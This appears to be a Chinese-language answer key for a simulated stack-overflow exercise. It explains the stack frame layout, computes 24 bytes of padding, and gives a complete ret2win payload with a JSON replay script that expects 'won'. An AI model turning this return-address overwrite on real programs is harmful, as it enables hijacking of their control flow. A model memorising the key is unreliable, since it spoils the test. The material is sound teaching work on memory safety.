# stackframe 参考解法

考点是**返回地址在栈帧里的位置**：它不在栈顶，也不在 buf 里，而在**帧指针上方**。
地址必须从 `RBP` 与帧结构算出来，不能靠猜一个固定地址。

## 1. 程序停在哪、帧长什么样

`vuln` 的前两条指令就是标准的建帧序言：

```
push rbp          ; rsp -= 8; [rsp] = 旧 rbp
mov rbp, rsp      ; rbp 指向刚压进来的那个字
```

本题在 `mov rbp, rsp` **执行完之后**停下来（`RIP = 0x400002`，下一条是 `mov rsi, buf`），
初态里 `RSP = RBP = 0x7ffffef8`，也就是帧已经建好：

| 地址 | 相对 `RBP` | 内容 |
|---|---|---|
| `0x7ffffee8` | `[rbp-0x10]` | `buf`，16 字节，`read` 的落点 |
| `0x7ffffef8` | `[rbp]` | **saved rbp**：调用者保存的旧帧指针（初值 `0x7ffffef8`） |
| `0x7fffff00` | `[rbp+8]` | **ret addr**：返回地址，初值 `0x40002a`（`lose`） |

所以「返回地址在帧里的位置」是 **`[rbp] + 8`，即 `[rbp+8]`**：被调者保存的旧 `RBP`
压在帧底，返回地址紧跟在它上面一个栈槽。

## 2. 要写多少字节、写在哪

`vuln` 用 `read(0, buf, 0x20)` 把 stdin 的字节整段写进 `buf`（`0x7ffffee8`），
写多少就覆盖多少——`read` 不检查 `buf` 的边界，这就是溢出点。

从 `buf` 的起点算到 `[rbp+8]`：

```
buf            : [rbp-0x10] ~ [rbp-0x9]   16 字节
saved rbp      : [rbp]     ~ [rbp+7]      8 字节
ret addr       : [rbp+8]   ~ [rbp+0xf]    8 字节
一共需要 16 + 8 = 24 字节 padding，再接 8 字节目标地址
```

前 24 字节写什么都可以：它们只覆盖 `buf` 与 saved rbp，而 `leave` 之后 `ret` 不再读 `RBP`
（`ret` 只看 `RSP`），所以 24 个字节全用 `41`：

```
0x7ffffee8: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   ← buf（16 字节）
0x7ffffef8: 41 41 41 41 41 41 41 41                           ← saved rbp
0x7fffff00: 20 00 40 00 00 00 00 00                           ← ret addr → win (0x400020)
```

最后 8 个字节是 `win` 的地址 `0x400020`，按小端序写（最低位字节在最前面）：
`0x400020` → `20 00 40 00 00 00 00 00`。`win` 的地址在指令视图里能看到（`win` 标签那一行）。

## 3. 完整的 payload

```
41414141414141414141414141414141 4141414141414141 2000400000000000
└────────── 24 字节 padding ──────────┘ └─ ret addr ─┘
```

十六进制串：`4141414141414141414141414141414141414141414141412000400000000000`（32 字节）。

用 `capture(buf)` 把它喂进 stdin，再 `run`：

1. `read(0, buf, 0x20)` 把 32 字节写进 `0x7ffffee8`，`[rbp+8]` 变成 `0x400020`；
2. `leave`：`rsp = rbp`（`0x7ffffef8`），再把 `[rbp]` 弹回 `rbp`（saved rbp 被改成
   `0x4141414141414141`，无所谓，`ret` 不看它）；
3. `ret`：从 `rsp = 0x7fffff00` 取出 `0x400020`，`RIP` 跳到 `win`；
4. `win`：`mov rax, 99` 把调用号放进 `RAX`，`syscall` 据此把 `FLAG` 置 1 并退出。

`capture` 的展开动作是 `feed`（只往 stdin 追加字节），所以 payload 从初始状态回放即可复现：
地址与字节全是字面量，不含任何读运行时状态的构造。

```json
{
  "actions": [
    {
      "type": "block",
      "id": "capture",
      "args": { "data": "4141414141414141414141414141414141414141414141412000400000000000" }
    },
    { "type": "run" }
  ],
  "expectedVerdict": "won",
  "note": "24 字节 padding（填满 buf 与 saved rbp）+ win 地址（[rbp+8]，小端序），然后让 leave; ret 跳过去"
}
```
